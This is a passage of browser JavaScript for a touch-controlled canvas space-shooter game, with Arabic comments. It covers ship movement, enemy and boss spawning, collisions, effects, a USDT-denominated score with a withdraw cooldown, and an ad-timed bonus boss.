        let lastWithdrawTime = parseInt(localStorage.getItem('fwvLastWithdraw') || '0');
        let cooldownInterval = null;
        const cooldownBar = document.getElementById('cooldownBar');
        const cooldownTimer = document.getElementById('cooldownTimer');

        function updateCooldown() {
            const now = Date.now();
            const remaining = WITHDRAW_COOLDOWN - (now - lastWithdrawTime);
            if (lastWithdrawTime === 0 || remaining <= 0) {
                cooldownBar.classList.remove('show');
                if (cooldownInterval) { clearInterval(cooldownInterval); cooldownInterval = null; }
                return;
            }
            cooldownBar.classList.add('show');
            const h = Math.floor(remaining / 3600000);
            const m = Math.floor((remaining % 3600000) / 60000);
            const s = Math.floor((remaining % 60000) / 1000);
            cooldownTimer.textContent = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }

        function startCooldownWatcher() {
            if (cooldownInterval) return;
            cooldownInterval = setInterval(updateCooldown, 1000);
            updateCooldown();
        }

        function isWithdrawLocked() {
            if (lastWithdrawTime === 0) return false;
            return (Date.now() - lastWithdrawTime) < WITHDRAW_COOLDOWN;
        }

        function updateShipSize() {
            if (!imageLoaded) return;
            const targetWidth = Math.min(arena.width * 0.13, arena.height * 1.0);
            const aspect = shipImg.width / shipImg.height;
            ship.width = targetWidth;
            ship.height = targetWidth / aspect;
        }

        function resizeCanvas() {
            viewWidth = window.innerWidth;
            viewHeight = window.innerHeight;

            canvas.width = viewWidth * DPR;
            canvas.height = viewHeight * DPR;
            canvas.style.width = viewWidth + 'px';
            canvas.style.height = viewHeight + 'px';

            ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = 'low';

            arena.x = 0;
            arena.width = viewWidth;
            arena.height = viewHeight;
            arena.y = 0;

            selectShipSize = Math.min(arena.width * 0.18, arena.height * 0.25);
            shipSpacing = selectShipSize * 1.7;
            selectLeftX = arena.x + arena.width * 0.07;
            selectCenterY = arena.y + arena.height / 2;

            const btnWidth = Math.min(arena.width * 0.28, 180);
            const btnHeight = Math.min(arena.height * 0.28, 55);
            startButton = {
                x: arena.x + arena.width * 0.65 + (arena.width * 0.28 - btnWidth) / 2,
                y: arena.y + (arena.height - btnHeight) / 2,
                width: btnWidth,
                height: btnHeight
            };

            if (gameState === 'select') {
                ship.x = arena.x + arena.width / 2;
                ship.y = arena.y + arena.height / 2;
                ship.targetX = ship.x;
                ship.targetY = ship.y;
            } else {
                ship.x = Math.min(ship.x, arena.width - ship.width / 2);
                ship.y = Math.min(ship.y, arena.height - ship.height / 2);
                ship.targetX = Math.min(ship.targetX, arena.width - ship.width / 2);
                ship.targetY = Math.min(ship.targetY, arena.height - ship.height / 2);
            }

            updateShipSize();
        }

        SHIPS_DATA.forEach((data, index) => {
            const img = new Image();
            img.onload = () => {
                data.preview = img;
                data.loaded = true;
                if (index === selectedShipIndex) {
                    shipImg = img;
                    imageLoaded = true;
                    updateShipSize();
                }
            };
            img.src = data.imgSrc;
        });

        window.addEventListener('resize', resizeCanvas);
        window.addEventListener('orientationchange', () => setTimeout(resizeCanvas, 150));

        function toggleFullscreen() {
            const el = document.documentElement;
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
                if (screen.orientation && screen.orientation.lock) screen.orientation.lock('landscape').catch(() => {});
            } else {
                if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
                else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
            }
        }

        function getTouchPos(touch) {
            const rect = canvas.getBoundingClientRect();
            return { x: touch.clientX - rect.left, y: touch.clientY - rect.top };
        }

        function handleTouchStart(pos, id) {
            if (gameState === 'select') {
                if (pos.x >= startButton.x && pos.x <= startButton.x + startButton.width &&
                    pos.y >= startButton.y && pos.y <= startButton.y + startButton.height) {
                    startGame();
                    return;
                }
                isDragging = true; dragTouchId = id; dragStartY = pos.y; dragStartScrollY = scrollTargetY;
                lastDragY = pos.y; lastDragTime = Date.now(); dragMoved = false; scrollVelocity = 0;
            } else if (gameState === 'playing') {
                if (pos.x < viewWidth / 2) {
                    if (!leftTouch.active) {
                        leftTouch.active = true;
                        leftTouch.id = id;
                        leftTouch.x = pos.x;
                        leftTouch.y = pos.y;
                        ship.targetX = Math.max(arena.x + ship.width / 2, Math.min(arena.x + arena.width - ship.width / 2, pos.x));
                        ship.targetY = Math.max(arena.y + ship.height / 2, Math.min(arena.y + arena.height - ship.height / 2, pos.y));
                    }
                } else {
                    if (!rightTouch.active) {
                        rightTouch.active = true;
                        rightTouch.id = id;
                        fireBullet();
                        fireInterval = setInterval(fireBullet, 120);
                    }
                    isChargingOrb = true;
                    chargeTouchId = id;
                    chargeStartX = pos.x;
                    chargeCurrentX = pos.x;
                    lastChargeX = pos.x;
                    lastChargeTime = Date.now();
                    chargeSpeed = 0;
                }
            }
        }

        function handleTouchMove(pos, id) {
            if (gameState === 'select' && isDragging && id === dragTouchId) {
                const dy = pos.y - dragStartY;
                if (Math.abs(dy) > 5) dragMoved = true;
                scrollTargetY = dragStartScrollY + dy;
                const now = Date.now();
                const dt = now - lastDragTime;
                if (dt > 0) scrollVelocity = (pos.y - lastDragY) / dt;
                lastDragY = pos.y; lastDragTime = now;
            } else if (gameState === 'playing') {
                if (id === leftTouch.id) {
                    leftTouch.x = pos.x;
                    leftTouch.y = pos.y;
                    ship.targetX = Math.max(arena.x + ship.width / 2, Math.min(arena.x + arena.width - ship.width / 2, pos.x));
                    ship.targetY = Math.max(arena.y + ship.height / 2, Math.min(arena.y + arena.height - ship.height / 2, pos.y));
                }
                if (isChargingOrb && id === chargeTouchId) {
                    const now = Date.now();
                    const dt = now - lastChargeTime;
                    if (dt > 0) chargeSpeed = (pos.x - lastChargeX) / dt;
                    lastChargeX = pos.x; lastChargeTime = now; chargeCurrentX = pos.x;
                    if (chargeSpeed > 0.8 && chargeCurrentX - chargeStartX > 40) {
                        firePowerOrb();
                        isChargingOrb = false;
                    }
                }
            }
        }

        function handleTouchEnd(id) {
            if (gameState === 'select' && id === dragTouchId) {
                isDragging = false; dragTouchId = null;
                if (dragMoved) scrollTargetY += scrollVelocity * 100;
                alignToNearest();
            }
            if (id === leftTouch.id) { leftTouch.active = false; leftTouch.id = null; }
            if (id === rightTouch.id) {
                rightTouch.active = false; rightTouch.id = null;
                if (fireInterval) { clearInterval(fireInterval); fireInterval = null; }
            }
            if (id === chargeTouchId) { isChargingOrb = false; chargeTouchId = null; }
        }

        canvas.addEventListener('touchstart', (e) => {
            e.preventDefault();
            unlockAudio();
            for (let i = 0; i < e.changedTouches.length; i++) {
                handleTouchStart(getTouchPos(e.changedTouches[i]), e.changedTouches[i].identifier);
            }
        }, { passive: false });

        canvas.addEventListener('touchmove', (e) => {
            e.preventDefault();
            for (let i = 0; i < e.changedTouches.length; i++) {
                handleTouchMove(getTouchPos(e.changedTouches[i]), e.changedTouches[i].identifier);
            }
        }, { passive: false });

        canvas.addEventListener('touchend', (e) => {
            e.preventDefault();
            for (let i = 0; i < e.changedTouches.length; i++) {
                handleTouchEnd(e.changedTouches[i].identifier);
            }
        }, { passive: false });

        canvas.addEventListener('touchcancel', (e) => {
            e.preventDefault();
            for (let i = 0; i < e.changedTouches.length; i++) {
                handleTouchEnd(e.changedTouches[i].identifier);
            }
        }, { passive: false });

        canvas.addEventListener('mousedown', (e) => {
            unlockAudio();
            const rect = canvas.getBoundingClientRect();
            handleTouchStart({ x: e.clientX - rect.left, y: e.clientY - rect.top }, 'mouse');
        });
        canvas.addEventListener('mousemove', (e) => {
            const rect = canvas.getBoundingClientRect();
            const pos = { x: e.clientX - rect.left, y: e.clientY - rect.top };
            if (isDragging || isChargingOrb) handleTouchMove(pos, 'mouse');
        });
        canvas.addEventListener('mouseup', () => handleTouchEnd('mouse'));

        function alignToNearest() {
            let idx = Math.round(-scrollTargetY / shipSpacing);
            idx = Math.max(0, Math.min(5, idx));
            selectedShipIndex = idx;
            scrollTargetY = -idx * shipSpacing;
            const data = SHIPS_DATA[idx];
            if (data.loaded) { shipImg = data.preview; imageLoaded = true; updateShipSize(); }
        }

        function startGame() {
            gameState = 'playing';
            ship.x = selectLeftX + selectShipSize / 2;
            ship.y = selectCenterY;
            ship.targetX = ship.x;
            ship.targetY = ship.y;
            ship.recoil = 0; ship.glow = 0; ship.shake = 0;
            ship.angle = 0; ship.vx = 0; ship.vy = 0;

            bullets.length = 0; enemyBullets.length = 0; powerOrbs.length = 0;
            particles.length = 0; muzzleFades.length = 0;
            enemies.length = 0; explosions.length = 0; smokeParticles.length = 0;

            enemySpawnTimer = 0;
            enemiesKilled = 0;
            bossActive = false;
            shipHP.current = shipHP.max;
            shipHP.hitFlash = 0; shipHP.invulnerable = 0;
            updateWithdrawBtn();
        }

        function spawnEnemy() {
            if (!enemyLoaded) return;
            const targetWidth = Math.min(arena.width * 0.08, 55);
            const aspect = enemyImg.width / enemyImg.height;
            const w = targetWidth;
            const h = w / aspect;
            enemies.push({
                x: arena.width + w / 2,
                y: h / 2 + Math.random() * (arena.height - h),
                size: w, width: w, height: h,
                speed: 1.8 + Math.random() * 1.5,
                hp: 1, maxHp: 1, hitFlash: 0, isBoss: false,
                vx: 0, vy: 0,
                shootTimer: 150 + Math.floor(Math.random() * 150),
                shootCooldown: 150 + Math.floor(Math.random() * 100)
            });
        }

        function spawnBoss() {
            if (!bossLoaded) return;
            const targetWidth = Math.min(arena.width * 0.32, 180);
            const aspect = bossImg.width / bossImg.height;
            const w = targetWidth;
            const h = w / aspect;
            enemies.push({
                x: arena.width + w / 2, y: arena.height / 2,
                size: w, width: w, height: h,
                speed: 0.5, hp: 15, maxHp: 15,
                hitFlash: 0, isBoss: true, isBonusBoss: false,
                movePhase: 0, moveTimer: 0, baseY: arena.height / 2,
                shootTimer: 60, shootCooldown: 60,
                stopped: false, stopX: arena.width * 0.7, recoil: 0
            });
            bossActive = true;
        }

        function spawnSoldiersFromBoss(bx, by) {
            const count = 6;
            for (let i = 0; i < count; i++) {
                const angle = (i / count) * Math.PI * 2;
                const targetWidth = Math.min(arena.width * 0.08, 55);
                const aspect = enemyImg.width / enemyImg.height;
                const w = targetWidth;
                const h = w / aspect;
                enemies.push({
                    x: bx, y: by, size: w, width: w, height: h,
                    speed: 2 + Math.random() * 1.5, hp: 1, maxHp: 1,
                    hitFlash: 0, isBoss: false, isBonusBoss: false,
                    vx: Math.cos(angle) * 3, vy: Math.sin(angle) * 3,
                    spreadTimer: 40, shootTimer: 150, shootCooldown: 150
                });
            }
        }

        /* ============================================
           🎁 العدو الضخم الخاص (يستخدم USDX.png)
        ============================================ */
        function spawnBonusBoss() {
            if (!enemyLoaded) return;

            const targetWidth = Math.min(arena.width * 0.35, 200);
            const aspect = enemyImg.width / enemyImg.height;
            const w = targetWidth;
            const h = w / aspect;

            enemies.push({
                x: arena.width + w / 2,
                y: arena.height / 2,
                size: w,
                width: w,
                height: h,
                speed: 0.6,
                hp: 5,
                maxHp: 5,
                hitFlash: 0,
                isBoss: true,
                isBonusBoss: true,     // ✅ يستخدم USDX.png + توهج ذهبي
                movePhase: 0,
                moveTimer: 0,
                baseY: arena.height / 2,
                shootTimer: 45,
                shootCooldown: 45,
                stopped: false,
                stopX: arena.width * 0.7,
                recoil: 0
            });

            bossActive = true;

            for (let k = 0; k < 30; k++) {
                const angle = Math.random() * Math.PI * 2;
                const speed = 3 + Math.random() * 8;
                explosions.push({
                    x: arena.width + w / 2,
                    y: arena.height / 2,
                    vx: Math.cos(angle) * speed,
                    vy: Math.sin(angle) * speed,
                    life: 25,
                    maxLife: 40,
                    size: 3 + Math.random() * 4,
                    color: '#f39c12'
                });
            }
        }

        function fireBullet() {
            const data = SHIPS_DATA[selectedShipIndex];
            const mx = ship.x + ship.width / 2 - 8;
            const my = ship.y;
            playShootSound();

            if (data.bulletType === 'triangle') {
                bullets.push({ x: mx, y: my, vx: 18, vy: (Math.random() - 0.5) * 0.3, life: 150, maxLife: 150, size: 6, type: 'triangle' });
            } else {
                bullets.push({ x: mx, y: my, vx: 18, vy: (Math.random() - 0.5) * 0.3, life: 150, maxLife: 150, width: 10, height: 3, type: 'rect' });
            }

            muzzleFades.push({ x: mx, y: my, radius: 5, maxRadius: 30, life: 10, maxLife: 10, color: data.glowColor, coreColor: data.coreColor });

            for (let i = 0; i < 2; i++) {
                const angle = (Math.random() - 0.5) * Math.PI * 0.9;
                const speed = 3 + Math.random() * 5;
                particles.push({ x: mx, y: my, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 10, maxLife: 10, size: 1.2, color: data.glowColor });
            }

            ship.recoil = 12;
            ship.glow = 0.6;
            ship.shake = 1.5;
        }

        function firePowerOrb() {
            const data = SHIPS_DATA[selectedShipIndex];
            const mx = ship.x + ship.width / 2 - 8;
            const my = ship.y;
            playShootSound();
            powerOrbs.push({ x: mx, y: my, vx: 14, vy: 0, life: 140, maxLife: 140, radius: 6, maxRadius: 35, growth: 0.35 });
            muzzleFades.push({ x: mx, y: my, radius: 8, maxRadius: 55, life: 15, maxLife: 15, color: data.glowColor, coreColor: '#ffffff' });
            ship.recoil = 20;
            ship.glow = 1.2;
            ship.shake = 5;
        }

        function bossFire(enemy) {
            playBossFireSound();
            enemy.recoil = 15;
            for (let i = 0; i < 3; i++) {
                const dx = ship.x - enemy.x;
                const dy = ship.y - enemy.y;
                const angle = Math.atan2(dy, dx) + (i - 1) * 0.15;
                const speed = 6;
                enemyBullets.push({
                    x: enemy.x - (enemy.width || enemy.size) * 0.3,
                    y: enemy.y + (i - 1) * 12,
                    vx: Math.cos(angle) * speed,
                    vy: Math.sin(angle) * speed,
                    life: 200, maxLife: 200, width: 16, height: 4, isBossBullet: true
                });
            }
        }

        function enemyFire(enemy) {
            playEnemyFireSound();
            const dx = ship.x - enemy.x;
            const dy = ship.y - enemy.y;
            const angle = Math.atan2(dy, dx);
            const speed = 4.5;
            enemyBullets.push({
                x: enemy.x - enemy.size * 0.3, y: enemy.y,
                vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed,
                life: 200, maxLife: 200, width: 10, height: 3, isBossBullet: false
            });
        }

        /* ============================================
           🎁 زر العدو الضخم
        ============================================ */
        function updateBossBtn() {
            const btn = document.getElementById('bossBtn');
            if (!btn) return;

            if (gameState !== 'playing') {
                btn.classList.remove('show');
                return;
            }

            const now = Date.now();
            if (now - bossBtnCooldown >= BOSS_COOLDOWN && !adRunning) {
                btn.classList.add('show');
            } else {
                btn.classList.remove('show');
            }
        }

        function startBossAd() {
            if (adRunning) return;
            if (gameState !== 'playing') return;

            const now = Date.now();
            if (now - bossBtnCooldown < BOSS_COOLDOWN) return;

            adRunning = true;
            document.getElementById('bossBtn').classList.remove('show');

            const overlay = document.getElementById('adOverlay');
            overlay.classList.add('show');

            let timeLeft = BOSS_AD_DURATION;
            const adCount = document.getElementById('adCount');
            const adCircle = document.getElementById('adCircle');
            const totalDash = 283;

            adCount.textContent = timeLeft;
            adCircle.style.strokeDashoffset = '0';

            const adInterval = setInterval(() => {
                timeLeft--;
                adCount.textContent = timeLeft;

                const offset = totalDash - (timeLeft / BOSS_AD_DURATION) * totalDash;
                adCircle.style.strokeDashoffset = offset;

                if (timeLeft <= 0) {
                    clearInterval(adInterval);
                    overlay.classList.remove('show');
                    adRunning = false;
                    spawnBonusBoss();
                    bossBtnCooldown = Date.now();
                }
            }, 1000);
        }

        /* ============================================
           التحديث
        ============================================ */
        let lastFrameTime = performance.now();

        function update(now) {
            const dt = Math.min((now - lastFrameTime) / 16.67, 3);
            lastFrameTime = now;

            updateBossBtn();

            for (let i = 0; i < stars.length; i++) {
                const s = stars[i];
                s.x -= s.speed * dt;
                if (s.x < 0) { s.x = viewWidth; s.y = Math.random() * viewHeight; }
            }

            for (let i = smokeParticles.length - 1; i >= 0; i--) {
                const p = smokeParticles[i];
                p.x -= p.vx * dt;
                p.life -= dt;
                p.size += 0.3 * dt;
                if (p.life <= 0) smokeParticles.splice(i, 1);
            }
            if (Math.random() < 0.3 && smokeParticles.length < 10) {
                smokeParticles.push({
                    x: viewWidth + 50, y: Math.random() * viewHeight,
                    vx: 0.5 + Math.random() * 0.8,
                    size: 40 + Math.random() * 60,
                    life: 200 + Math.random() * 200, maxLife: 400,
                    alpha: 0.08 + Math.random() * 0.08
                });
            }

            for (let i = muzzleFades.length - 1; i >= 0; i--) {
                const f = muzzleFades[i];
                f.life -= dt;
                const progress = 1 - (f.life / f.maxLife);
                f.radius = 5 + (f.maxRadius - 5) * progress;
                if (f.life <= 0) muzzleFades.splice(i, 1);
            }

            displayedScore += (usdtScore - displayedScore) * 0.15;

            if (shipHP.hitFlash > 0) shipHP.hitFlash -= dt;
            if (shipHP.invulnerable > 0) shipHP.invulnerable -= dt;

            if (gameState === 'select') {
                const easing = isDragging ? 0.35 : 0.15;
                scrollY += (scrollTargetY - scrollY) * easing;
                return;
            }

            if (gameState === 'gameover') return;

            enemySpawnTimer += dt;
            if (enemySpawnTimer >= enemySpawnInterval && !bossActive) {
                enemySpawnTimer = 0;
                spawnEnemy();
                if (enemySpawnInterval > 45) enemySpawnInterval -= 0.3;
            }

            if (leftTouch.active) {
                const dx = ship.targetX - ship.x;
                const dy = ship.targetY - ship.y;
                if (Math.abs(dx) > 200 || Math.abs(dy) > 200) {
                    ship.x += dx * 0.5 * dt;
                    ship.y += dy * 0.5 * dt;
                } else {
                    ship.x += dx * 0.25 * dt;
                    ship.y += dy * 0.25 * dt;
                }
                ship.angle = Math.max(-0.3, Math.min(0.3, dy * 0.02));
            } else {
                ship.angle *= 0.9;
            }

            ship.x = Math.max(ship.width / 2, Math.min(arena.width - ship.width / 2, ship.x));
            ship.y = Math.max(ship.height / 2, Math.min(arena.height - ship.height / 2, ship.y));

            if (ship.recoil > 0) { ship.recoil *= 0.87; if (ship.recoil < 0.1) ship.recoil = 0; }
            if (ship.glow > 0) { ship.glow *= 0.93; if (ship.glow < 0.01) ship.glow = 0; }
            if (ship.shake > 0) { ship.shake *= 0.8; if (ship.shake < 0.1) ship.shake = 0; }

            for (let i = bullets.length - 1; i >= 0; i--) {
                const b = bullets[i];
                b.x += b.vx * dt;
                b.y += b.vy * dt;
                b.life -= dt;

                let hit = false;
                for (let j = enemies.length - 1; j >= 0; j--) {
                    const e = enemies[j];
                    const dx = b.x - e.x;
                    const dy = b.y - e.y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    const cs = e.isBoss ? (e.width || e.size) * 0.35 : e.size * 0.4;

                    if (dist < cs) {
                        e.hp--;
                        e.hitFlash = 6;

                        for (let k = 0; k < 4; k++) {
                            const angle = Math.random() * Math.PI * 2;
                            const speed = 3 + Math.random() * 4;
                            explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 12, maxLife: 20, size: 1.5 + Math.random() * 2, color: e.isBonusBoss ? '#f39c12' : '#26a17b' });
                        }

                        if (e.hp <= 0) {
                            if (e.isBoss) {
                                playBossDeathSound();
                                bossKilled++;
                                if (e.isBonusBoss) {
                                    usdtScore += BOSS_BONUS_POINTS * KILL_VALUE;
                                } else {
                                    usdtScore += BOSS_KILL_VALUE;
                                }
                                bossActive = false;
                                for (let k = 0; k < 30; k++) {
                                    const angle = Math.random() * Math.PI * 2;
                                    const speed = 4 + Math.random() * 10;
                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 20 + Math.random() * 15, maxLife: 35, size: 3 + Math.random() * 3, color: e.isBonusBoss ? '#f39c12' : '#0a3d1a' });
                                }
                                if (!e.isBonusBoss) spawnSoldiersFromBoss(e.x, e.y);
                            } else {
                                enemiesKilled++;
                                usdtScore += KILL_VALUE;
                                for (let k = 0; k < 10; k++) {
                                    const angle = Math.random() * Math.PI * 2;
                                    const speed = 3 + Math.random() * 6;
                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 15, maxLife: 25, size: 2 + Math.random() * 2.5, color: '#26a17b' });
                                }
                            }
                            enemies.splice(j, 1);
                            if (!e.isBoss && enemiesKilled % ENEMIES_PER_BOSS === 0 && !bossActive) spawnBoss();
                            saveBalance();
                            updateWithdrawBtn();
                        }
                        hit = true;
                        break;
                    }
                }

                if (hit || b.x > arena.width + 50 || b.life <= 0) bullets.splice(i, 1);
            }

            for (let i = enemyBullets.length - 1; i >= 0; i--) {
                const eb = enemyBullets[i];
                eb.x += eb.vx * dt;
                eb.y += eb.vy * dt;
                eb.life -= dt;

                const dx = eb.x - ship.x;
                const dy = eb.y - ship.y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < ship.width * 0.35 && shipHP.invulnerable <= 0) {
                    shipHP.current -= (eb.isBossBullet ? 10 : 5);
                    shipHP.hitFlash = 12;
                    shipHP.invulnerable = 30;
                    for (let k = 0; k < 8; k++) {
                        const angle = Math.random() * Math.PI * 2;
                        const speed = 3 + Math.random() * 4;
                        explosions.push({ x: ship.x, y: ship.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 12, maxLife: 20, size: 1.5 + Math.random() * 2, color: '#ff3333' });
                    }
                    enemyBullets.splice(i, 1);
                    continue;
                }

                if (eb.x < -50 || eb.x > arena.width + 50 || eb.life <= 0) enemyBullets.splice(i, 1);
            }

            for (let i = powerOrbs.length - 1; i >= 0; i--) {
                const o = powerOrbs[i];
                o.x += o.vx * dt;
                o.y += o.vy * dt;
                o.life -= dt;
                if (o.radius < o.maxRadius) o.radius += o.growth * dt;

                for (let j = enemies.length - 1; j >= 0; j--) {
                    const e = enemies[j];
                    const dx = o.x - e.x;
                    const dy = o.y - e.y;
                    const dist = Math.sqrt(dx * dx + dy * dy);

                    if (dist < e.size * 0.5 + o.radius * 0.5) {
                        e.hp -= 3;
                        e.hitFlash = 10;
                        if (e.hp <= 0) {
                            if (e.isBoss) {
                                playBossDeathSound();
                                bossKilled++;
                                if (e.isBonusBoss) {
                                    usdtScore += BOSS_BONUS_POINTS * KILL_VALUE;
                                } else {
                                    usdtScore += BOSS_KILL_VALUE;
                                }
                                bossActive = false;
                                for (let k = 0; k < 30; k++) {
                                    const angle = Math.random() * Math.PI * 2;
                                    const speed = 4 + Math.random() * 10;
                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 20 + Math.random() * 15, maxLife: 35, size: 3 + Math.random() * 3, color: e.isBonusBoss ? '#f39c12' : '#0a3d1a' });
                                }
                                if (!e.isBonusBoss) spawnSoldiersFromBoss(e.x, e.y);
                            } else {
                                enemiesKilled++;
                                usdtScore += KILL_VALUE;
                                for (let k = 0; k < 14; k++) {
                                    const angle = Math.random() * Math.PI * 2;
                                    const speed = 4 + Math.random() * 8;
                                    explosions.push({ x: e.x, y: e.y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 15, maxLife: 25, size: 2 + Math.random() * 2.5, color: '#26a17b' });
                                }
                            }
                            enemies.splice(j, 1);
                            if (!e.isBoss && enemiesKilled % ENEMIES_PER_BOSS === 0 && !bossActive) spawnBoss();
                            saveBalance();
                            updateWithdrawBtn();
                        }
                    }
                }

                if (o.x > arena.width + 80 || o.life <= 0) powerOrbs.splice(i, 1);
            }

            for (let i = enemies.length - 1; i >= 0; i--) {
                const e = enemies[i];
                if (e.hitFlash > 0) e.hitFlash -= dt;

                if (e.isBoss) {
                    if (e.recoil && e.recoil > 0) { e.recoil *= 0.85; if (e.recoil < 0.5) e.recoil = 0; }
                    if (!e.stopped) {
                        e.x -= e.speed * dt;
                        if (e.x <= e.stopX) { e.x = e.stopX; e.stopped = true; }
                    } else {
                        e.moveTimer += 0.03 * dt;
                        e.y = e.baseY + Math.sin(e.moveTimer) * (arena.height * 0.3);
                        e.x = e.stopX + (e.recoil > 0 ? e.recoil : 0);
                    }
                    e.shootTimer -= dt;
                    if (e.shootTimer <= 0 && e.stopped) { bossFire(e); e.shootTimer = e.shootCooldown; }
                } else {
                    if (e.spreadTimer && e.spreadTimer > 0) {
                        e.x += e.vx * dt; e.y += e.vy * dt;
                        e.vx *= 0.94; e.vy *= 0.94;
                        e.spreadTimer -= dt;
                    }
                    e.x -= e.speed * dt;
                    if (e.x < arena.width * 0.95 && e.x > 30) {
                        e.shootTimer -= dt;
                        if (e.shootTimer <= 0) { enemyFire(e); e.shootTimer = e.shootCooldown; }
                    }
                }

                if (e.x < -100) enemies.splice(i, 1);
            }

            for (let i = particles.length - 1; i >= 0; i--) {
                const p = particles[i];
                p.x += p.vx * dt; p.y += p.vy * dt;
                p.vx *= 0.92; p.vy *= 0.92;
                p.life -= dt;
                if (p.life <= 0) particles.splice(i, 1);
            }

            for (let i = explosions.length - 1; i >= 0; i--) {
                const ex = explosions[i];
                ex.x += ex.vx * dt; ex.y += ex.vy * dt;
                ex.vx *= 0.95; ex.vy *= 0.95;
                ex.life -= dt;
                if (ex.life <= 0) explosions.splice(i, 1);
            }

            if (shipHP.current <= 0) {
                shipHP.current = 0;
                endGame();
            }
        }

        function endGame() {
            gameState = 'gameover';
            saveBalance();
            setTimeout(() => {
                gameState = 'select';
                updateWithdrawBtn();
            }, 1200);
        }

        function updateWithdrawBtn() {
            const btn = document.getElementById('withdrawBtn');
            const text = document.getElementById('withdrawText');
            if (isWithdrawLocked()) {
                btn.disabled = true; text.textContent = 'انتظر...';
                return;
            }
            if (usdtScore >= MIN_WITHDRAW) {
                btn.disabled = false; text.textContent = 'سحب ' + usdtScore.toFixed(4);
            } else {
                btn.disabled = true; text.textContent = 'الحد 0.01';
            }
        }

        /* ============================================
           الرسم
        ============================================ */
        function drawBackground() {
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, viewWidth, viewHeight);

            smokeParticles.forEach(p => {
                const alpha = (p.life / p.maxLife) * p.alpha;
                const grad = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.size);
                grad.addColorStop(0, `rgba(80, 80, 100, ${alpha})`);
                grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
                ctx.fillStyle = grad;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fill();
            });

            ctx.globalAlpha = 1;
            ctx.fillStyle = '#ffffff';
            stars.forEach(s => {
                if (s.alpha > 0.3) {
                    ctx.globalAlpha = s.alpha;
                    ctx.fillRect(s.x, s.y, s.size, s.size);
                }
            });
            ctx.globalAlpha = 1;
        }

        function drawGame() {
            const data = SHIPS_DATA[selectedShipIndex];
            drawBackground();

            ctx.save();
            ctx.beginPath();
            ctx.rect(0, 0, viewWidth, viewHeight);
            ctx.clip();

            muzzleFades.forEach(f => {
                const progress = f.life / f.maxLife;
                ctx.save();
                const grad = ctx.createRadialGradient(f.x, f.y, 0, f.x, f.y, f.radius);
                grad.addColorStop(0, f.coreColor);
                grad.addColorStop(0.4, f.color);
                grad.addColorStop(1, 'rgba(0, 0, 0, 0)');
                ctx.fillStyle = grad;
                ctx.globalAlpha = progress;
                ctx.beginPath();
                ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2);
                ctx.fill();
                ctx.restore();
            });

            // ===== الأعداء =====
            enemies.forEach(e => {
                // ✅ تحديد الصورة الصحيحة
                let img, isLoaded;
                if (e.isBonusBoss) {
                    img = enemyImg;         // ← USDX.png للعدو الضخم الخاص
                    isLoaded = enemyLoaded;
                } else if (e.isBoss) {
                    img = bossImg;          // ← USDTX.png للزعيم العادي
                    isLoaded = bossLoaded;
                } else {
                    img = enemyImg;         // ← USDX.png للعدو العادي
                    isLoaded = enemyLoaded;
                }

                if (!isLoaded) return;

                ctx.save();

                if (e.isBonusBoss) {
                    // 🎁 العدو الضخم الخاص — توهج ذهبي مع USDX.png
                    ctx.translate(e.x, e.y);
                    ctx.shadowBlur = 30;
                    ctx.shadowColor = '#f39c12';
                    if (e.hitFlash > 0) ctx.globalAlpha = 0.7;
                    ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
                    // طبقة توهج إضافية
                    ctx.globalAlpha = 0.35;
                    ctx.shadowBlur = 50;
                    ctx.shadowColor = '#f39c12';
                    ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
                } else if (e.isBoss) {
                    // 👹 الزعيم العادي — توهج أخضر قاتم مع USDTX.png
                    ctx.translate(e.x, e.y);
                    ctx.shadowBlur = 15;
                    ctx.shadowColor = '#0a3d1a';
                    if (e.hitFlash > 0) ctx.globalAlpha = 0.7;
                    ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
                } else {
                    // 👾 عدو عادي
                    ctx.translate(e.x, e.y);
                    if (e.hitFlash > 0) {
                        ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
                        ctx.globalAlpha = 0.6;
                        ctx.globalCompositeOperation = 'lighter';
                        ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
                    } else {
                        ctx.drawImage(img, -e.width / 2, -e.height / 2, e.width, e.height);
                    }
                }
                ctx.restore();

                // شريط صحة الزعيم
                if (e.isBoss) {
                    const barW = e.width * 0.9;
                    const barH = 5;
                    const barX = e.x - barW / 2;
                    const barY = e.y - e.height / 2 - 12;
                    ctx.save();
                    ctx.fillStyle = 'rgba(0,0,0,0.7)';
                    ctx.fillRect(barX, barY, barW, barH);
                    ctx.fillStyle = e.isBonusBoss ? '#f39c12' : '#0a3d1a';
                    ctx.fillRect(barX, barY, barW * (e.hp / e.maxHp), barH);
                    ctx.restore();
                }
            });

            ctx.save();
            enemyBullets.forEach(eb => {
                const alpha = eb.life / eb.maxLife;
                ctx.globalAlpha = alpha;
